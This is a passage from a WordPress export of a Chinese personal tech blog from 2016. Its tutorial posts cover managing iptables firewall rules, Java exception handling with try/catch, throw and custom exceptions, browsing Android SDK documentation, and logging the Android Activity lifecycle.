		<wp:post_name><![CDATA[java%e4%b8%ad%e7%9a%84%e6%8e%a5%e5%8f%a3%e5%ba%94%e7%94%a8%e4%be%8b%e5%ad%90]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="myphoto"><![CDATA[个人摄影]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[210]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Linux中的iptables的查看、添加、删除和修改</title>
		<link>https://www.nervgeek.com/2016/01/27/linux%e4%b8%ad%e7%9a%84iptables%e7%9a%84%e6%9f%a5%e7%9c%8b%e3%80%81%e6%b7%bb%e5%8a%a0%e3%80%81%e5%88%a0%e9%99%a4%e5%92%8c%e4%bf%ae%e6%94%b9/</link>
		<pubDate>Wed, 27 Jan 2016 12:05:09 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=780</guid>
		<description></description>
		<content:encoded><![CDATA[这里只列出比较常用的参数，详细的man iptables
<strong>1、查看</strong>

<pre>iptables -nvL --line-number
</pre>

<ul>
    <li>-L 查看当前表的所有规则，默认查看的是filter表，如果要查看NAT表，可以加上-t NAT参数</li>
    <li>-n 不对ip地址进行查，加上这个参数显示速度会快很多</li>
    <li>-v 输出详细信息，包含通过该规则的数据包数量，总字节数及相应的网络接口</li>
    <li>–line-number 显示规则的序列号，这个参数在删除或修改规则时会用到</li>
</ul>

<!--more-->
<strong>2、添加</strong>
添加规则有两个参数：-A和-I。其中-A是添加到规则的末尾；-I可以插入到指定位置，没有指定位置的话默认插入到规则的首部
例如：
当前规则：

<pre>[root@test ~]# iptables -nL --line-number
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination
1    DROP       all  --  192.168.1.1          0.0.0.0/0
2    DROP       all  --  192.168.1.2          0.0.0.0/0
3    DROP       all  --  192.168.1.4          0.0.0.0/0
</pre>

添加一条规则到尾部：

<pre>[root@test ~]# iptables -A INPUT -s 192.168.1.5 -j DROP
</pre>

再插入一条规则到第三行：

<pre>[root@test ~]# iptables -I INPUT 3 -s 192.168.1.3 -j DROP
</pre>

查看：

<pre>[root@test ~]# iptables -nL --line-number
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination
1    DROP       all  --  192.168.1.1          0.0.0.0/0
2    DROP       all  --  192.168.1.2          0.0.0.0/0
3    DROP       all  --  192.168.1.3          0.0.0.0/0
4    DROP       all  --  192.168.1.4          0.0.0.0/0
5    DROP       all  --  192.168.1.5          0.0.0.0/0
</pre>

可以看到192.168.1.3插入到第三行，而原来的第三行192.168.1.4变成了第四行。
&nbsp;
<strong>3、删除</strong>
删除用-D参数
删除之前添加的规则（iptables -A INPUT -s 192.168.1.5 -j DROP）：

<pre>[root@test ~]# iptables -D INPUT -s 192.168.1.5 -j DROP
</pre>

有时候有些规则太长，删除时要写一大串，既浪费时间又容易写错，这时我们可以先使用–line-number查看出该条规则的行号，再通过行号删除

<pre>[root@test ~]# iptables -nv --line-number
iptables v1.4.7: no command specified
Try `iptables -h' or 'iptables --help' for more information.
[root@test ~]# iptables -nL --line-number
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination
1    DROP       all  --  192.168.1.1          0.0.0.0/0
2    DROP       all  --  192.168.1.2          0.0.0.0/0
3    DROP       all  --  192.168.1.3          0.0.0.0/0
</pre>

删除第二行规则

<pre>[root@test ~]# iptables -D INPUT 2
</pre>

&nbsp;
<strong>4、修改</strong>
修改使用-R参数
将第三行规则改为ACCEPT
先看下当前规则：

<pre>[root@test ~]# iptables -nL --line-number
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination
1    DROP       all  --  192.168.1.1          0.0.0.0/0
2    DROP       all  --  192.168.1.2          0.0.0.0/0
3    DROP       all  --  192.168.1.5          0.0.0.0/0
</pre>

修改：

<pre>[root@test ~]# iptables -R INPUT 3 -j ACCEPT
</pre>

再查看下：

<pre>[root@test ~]# iptables -nL --line-number
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination
1    DROP       all  --  192.168.1.1          0.0.0.0/0
2    DROP       all  --  192.168.1.2          0.0.0.0/0
3    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>780</wp:post_id>
		<wp:post_date><![CDATA[2016-01-27 20:05:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-27 12:05:09]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[linux%e4%b8%ad%e7%9a%84iptables%e7%9a%84%e6%9f%a5%e7%9c%8b%e3%80%81%e6%b7%bb%e5%8a%a0%e3%80%81%e5%88%a0%e9%99%a4%e5%92%8c%e4%bf%ae%e6%94%b9]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="iptables"><![CDATA[iptables]]></category>
		<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="category" nicename="%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f"><![CDATA[操作系统]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[232]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中的异常处理</title>
		<link>https://www.nervgeek.com/2016/01/28/java%e4%b8%ad%e7%9a%84%e5%bc%82%e5%b8%b8%e5%a4%84%e7%90%86/</link>
		<pubDate>Thu, 28 Jan 2016 08:29:20 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=784</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>1 . 程序中有些流程可能会报出异常，如果不正确处理异常，将导致程序中断执行，造成损失。</strong>
<strong>2 . try后面可以跟多个catch，但不管多少个，最后只会有一个catch被执行。</strong>
异常处理代码格式：

<pre>try{
    //会报出异常的代码
}catch(Excption e){
    //捕捉异常，执行代码
}finally{
    //处理完成后必定执行的代码(可选)
}</pre>

<!--more-->
<strong> 一、算术报错</strong>

<pre>public class ExceptionDemo01 {
    public static void main(String[] args) {
        int a = 10;
        int b = 0;
        int temp = 0;
        try{
            temp = a/b;
            //被除数不能为零
        }
        catch(ArithmeticException e){
        //ArithmeticException可以输出错误信息，Exception则不输出
            System.out.println(e);
        }
        System.out.println(temp);
    }
}</pre>

控制台输出：

<pre>java.lang.ArithmeticException: / by zero
0</pre>

&nbsp;
<strong>二、空指针异常、finally以及多catch</strong>

<pre>class Exc{
    int a = 10;
    int b = 0;
    //int b =10;
}
class ExceptionDemo01 {
    public static void main(String[] args) {
        Exc exc = null;
        exc = new Exc();
        /*
        假如注释上面的exc = new Exc();
        一：int b = 10;
        报空指针异常错误。
        二：int b = 0;
        依旧报空指针异常错误。
        因为多catch最后只会有一个catch被执行，而且空指针异常在前面。
        假如没有注释上面的exc = new Exc();
        一：int b = 0;
        报算术异常错误。
        */
        int temp = 0;
        try{
            emp = exc.a/exc.b;
        }
        catch(NullPointerException e){
            System.out.println("空指针异常"+e);
        }catch(ArithmeticException e){
            System.out.println("算术异常"+e);
        }finally{
            System.out.println("程序退出！");
        }
    }
}</pre>

&nbsp;
未完待续]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>784</wp:post_id>
		<wp:post_date><![CDATA[2016-01-28 16:29:20]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-28 08:29:20]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e7%9a%84%e5%bc%82%e5%b8%b8%e5%a4%84%e7%90%86]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="catch"><![CDATA[catch]]></category>
		<category domain="post_tag" nicename="finally"><![CDATA[finally]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="try"><![CDATA[try]]></category>
		<category domain="post_tag" nicename="%e5%bc%82%e5%b8%b8"><![CDATA[异常]]></category>
		<category domain="post_tag" nicename="%e6%8d%95%e6%8d%89"><![CDATA[捕捉]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%a9%ba%e6%8c%87%e9%92%88"><![CDATA[空指针]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[199]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中的throws关键字</title>
		<link>https://www.nervgeek.com/2016/01/29/java%e4%b8%ad%e7%9a%84throws%e5%85%b3%e9%94%ae%e5%ad%97/</link>
		<pubDate>Thu, 28 Jan 2016 16:16:05 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=790</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>1 . throws可以在定义一个方法的时候声明，使用throws声明之后的方法将异常抛给调用者处理，方法本身不会处理。</strong>
&nbsp;
<strong>代码示例：</strong>

<pre>class ExceptionDemo01 {
    public static void main(String[] args) {
        try{
            tell(10,0);
        }catch(Exception e){
            System.out.print("Ok!");
        }
    }
    public static void tell(int a,int b) throws ArithmeticException{
        int temp = 0;
        temp = a/b;
        System.out.print(temp);
    }
}</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>790</wp:post_id>
		<wp:post_date><![CDATA[2016-01-29 00:16:05]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-28 16:16:05]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e7%9a%84throws%e5%85%b3%e9%94%ae%e5%ad%97]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="throws"><![CDATA[throws]]></category>
		<category domain="post_tag" nicename="%e5%85%b3%e9%94%ae%e5%ad%97"><![CDATA[关键字]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[183]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中的throw关键字</title>
		<link>https://www.nervgeek.com/2016/01/29/java%e4%b8%ad%e7%9a%84throw%e5%85%b3%e9%94%ae%e5%ad%97/</link>
		<pubDate>Fri, 29 Jan 2016 08:15:11 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=793</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>1 . 使用throw关键字会抛出一个异常，抛出时直接抛出异常类的实例化对象即可。</strong>
<strong>示例代码：</strong>

<pre>public class ExceptionDemo02 {
    public static void main(String[] args) {
        try{
            throw new Exception("实例化异常对象");
        }catch(Exception e){
            System.out.println(e);
        }
    }
}</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>793</wp:post_id>
		<wp:post_date><![CDATA[2016-01-29 16:15:11]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-29 08:15:11]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e7%9a%84throw%e5%85%b3%e9%94%ae%e5%ad%97]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="throw"><![CDATA[throw]]></category>
		<category domain="post_tag" nicename="%e5%85%b3%e9%94%ae%e5%ad%97"><![CDATA[关键字]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[207]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中的自定义异常</title>
		<link>https://www.nervgeek.com/2016/01/29/java%e4%b8%ad%e7%9a%84%e8%87%aa%e5%ae%9a%e4%b9%89%e5%bc%82%e5%b8%b8/</link>
		<pubDate>Fri, 29 Jan 2016 09:14:57 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=795</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>1 . 自定义异常类只需要直接继承Exception即可完成。</strong>
<strong>示例代码：</strong>

<pre>class MyException extends Exception{
    public MyException(String errormsg){
        super(errormsg);
    }
}
public class ExceptionDemo03 {
    public static void main(String[] args) {
        try{
            throw new MyException("自定义异常");
        }catch(Exception e){
            System.out.println(e);
        }
    }
}</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>795</wp:post_id>
		<wp:post_date><![CDATA[2016-01-29 17:14:57]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-29 09:14:57]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e7%9a%84%e8%87%aa%e5%ae%9a%e4%b9%89%e5%bc%82%e5%b8%b8]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="%e5%bc%82%e5%b8%b8"><![CDATA[异常]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e8%87%aa%e5%ae%9a%e4%b9%89"><![CDATA[自定义]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[199]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Android-使用帮助文档</title>
		<link>https://www.nervgeek.com/2016/01/30/android-%e4%bd%bf%e7%94%a8%e5%b8%ae%e5%8a%a9%e6%96%87%e6%a1%a3/</link>
		<pubDate>Sat, 30 Jan 2016 08:26:25 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=799</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>1 . 打开SDK Manager，找到Documentation for Android SDK：</strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/JSDQZQVZZ__SJKHIRA@WM.png" rel="attachment wp-att-800"><img class="alignnone size-full wp-image-800" src="https://www.nervgeek.com/wp-content/uploads/2016/01/JSDQZQVZZ__SJKHIRA@WM.png" alt="JSDQZQ(VZZ__SJK$HIRA@WM" width="577" height="41" /></a><!--more-->
&nbsp;
<strong>2 . 打开SDK下载文件夹，API网页路径为docs/reference/packages.html</strong>
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/GFPFH3JEYFN@AU_RRCIE.png" rel="attachment wp-att-802"><img class="alignnone size-full wp-image-802" src="https://www.nervgeek.com/wp-content/uploads/2016/01/GFPFH3JEYFN@AU_RRCIE.png" alt="GFPFH3~J$EYFN@AU_[RRCIE" width="1407" height="904" /></a>
<strong>3 . 点击<code>API classes</code>，使用搜索功能来查找相关内容</strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/EAQLU_HA1QTKNZG8DJ.png" rel="attachment wp-att-806"><img class="alignnone size-full wp-image-806" src="https://www.nervgeek.com/wp-content/uploads/2016/01/EAQLU_HA1QTKNZG8DJ.png" alt="E(AQLU_HA)1QTK$NZG~8D[J" width="1849" height="1170" /></a>
&nbsp;
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>799</wp:post_id>
		<wp:post_date><![CDATA[2016-01-30 16:26:25]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-01-30 08:26:25]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[android-%e4%bd%bf%e7%94%a8%e5%b8%ae%e5%8a%a9%e6%96%87%e6%a1%a3]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
		<category domain="post_tag" nicename="android"><![CDATA[android]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="%e5%ae%89%e5%8d%93"><![CDATA[安卓]]></category>
		<category domain="post_tag" nicename="%e5%b8%ae%e5%8a%a9%e6%96%87%e6%a1%a3"><![CDATA[帮助文档]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[277]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Android中的Activity生命周期</title>
		<link>https://www.nervgeek.com/2016/02/01/android%e4%b8%ad%e7%9a%84activity%e7%94%9f%e5%91%bd%e5%91%a8%e6%9c%9f/</link>
		<pubDate>Mon, 01 Feb 2016 12:08:25 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=810</guid>
		<description></description>
		<content:encoded><![CDATA[先放一张图了解一下<strong>Activity</strong>的生命周期：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/activity_lifecycle.png" rel="attachment wp-att-811"><img class="alignnone wp-image-811" src="https://www.nervgeek.com/wp-content/uploads/2016/02/activity_lifecycle.png" alt="activity_lifecycle" width="544" height="703" /></a><!--more-->
先占个位，生命周期图找日详细写一写。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/148XJL9VR95Y3Y0TRKM.png" rel="attachment wp-att-817"><img class="alignnone wp-image-817" src="https://www.nervgeek.com/wp-content/uploads/2016/02/148XJL9VR95Y3Y0TRKM.png" alt="148XJL9V{R$95Y3Y~0$TRKM" width="533" height="578" /></a>
<strong>本人英语渣，粗略翻译。</strong>
<strong>上图可知，Activity有七个函数，分别是：</strong>
<code>onCreate();</code>
<code>onStart();</code>
<code>onResume();</code>
<code>onPause();</code>
<code>onStop();</code>
<code>onDestroy();</code>
<code>onRestart();</code>
&nbsp;
先在<strong>MainActivity.java</strong>的<code>MainActivity</code>函数中重写上面的函数：

<pre>public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        System.out.println("onCreate");//输出日志信息
    }
    protected void onStart(){
        super.onStart();
        System.out.println("onStart");//输出日志信息
    }
    protected void onResume(){
        super.onResume();
        System.out.println("onResume");//输出日志信息
    }
    protected void onPause(){
        super.onPause();
        System.out.println("onPause");//输出日志信息
    }
    protected void onStop(){
        super.onStop();
        System.out.println("onStop");//输出日志信息
    }
    protected void onDestroy(){
        super.onDestroy();
        System.out.println("onDestroy");//输出日志信息
    }
    protected void onRestart(){
        super.onRestart();
        System.out.println("onRestart");//输出日志信息
    }
//无关代码不复制
}</pre>

&nbsp;
运行程序，查看<strong>logcat</strong>显示出来的日志(可在过滤器使用<strong>System.out</strong>为<strong>Log Tag</strong>来过滤信息)。
<strong>软件打开</strong>的时候，程序日志输出：

<pre>I/System.out: onCreate
I/System.out: onStart
I/System.out: onResume</pre>

<strong>程序在打开运行时，先执行<code>onCreate</code>，然后执行<code>onStart</code>和<code>onResume</code>三个函数。 </strong>
&nbsp;
<strong>当我点击锁屏</strong>或者<strong>返回主页</strong>时，程序日志输出：

<pre>com.nervgeek.mr9esx.androidactivity I/System.out: onPause
com.nervgeek.mr9esx.androidactivity I/System.out: onStop</pre>

关闭屏幕或返回主页的同时，程序执行<code>onPause</code>，然后执行<code>onStop</code>。
&nbsp;
&nbsp;
<strong>再次点亮屏幕回到程序Activity</strong>或者<strong>返回程序Activity</strong>，程序日志输出：

<pre>com.nervgeek.mr9esx.androidactivity I/System.out: onRestart
com.nervgeek.mr9esx.androidactivity I/System.out: onStart
com.nervgeek.mr9esx.androidactivity I/System.out: onResume</pre>

程序还原本来的状态，执行<code>onRestart</code>，然后执行<code>onStart</code>和<code>onResume</code>。
&nbsp;
当我们<strong>按下返回</strong>，程序日志输出：

<pre>com.nervgeek.mr9esx.androidactivity I/System.out: onPause
com.nervgeek.mr9esx.androidactivity I/System.out: onStop
com.nervgeek.mr9esx.androidactivity I/System.out: onDestroy</pre>

&nbsp;
单个Activity的生命周期大概就这样了，如有缺漏日后再补充。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>810</wp:post_id>
		<wp:post_date><![CDATA[2016-02-01 20:08:25]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-01 12:08:25]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[android%e4%b8%ad%e7%9a%84activity%e7%94%9f%e5%91%bd%e5%91%a8%e6%9c%9f]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="activity"><![CDATA[activity]]></category>
		<category domain="post_tag" nicename="android"><![CDATA[android]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="%e5%ae%89%e5%8d%93"><![CDATA[安卓]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%94%9f%e5%91%bd%e5%91%a8%e6%9c%9f"><![CDATA[生命周期]]></category>
						<wp:postmeta>
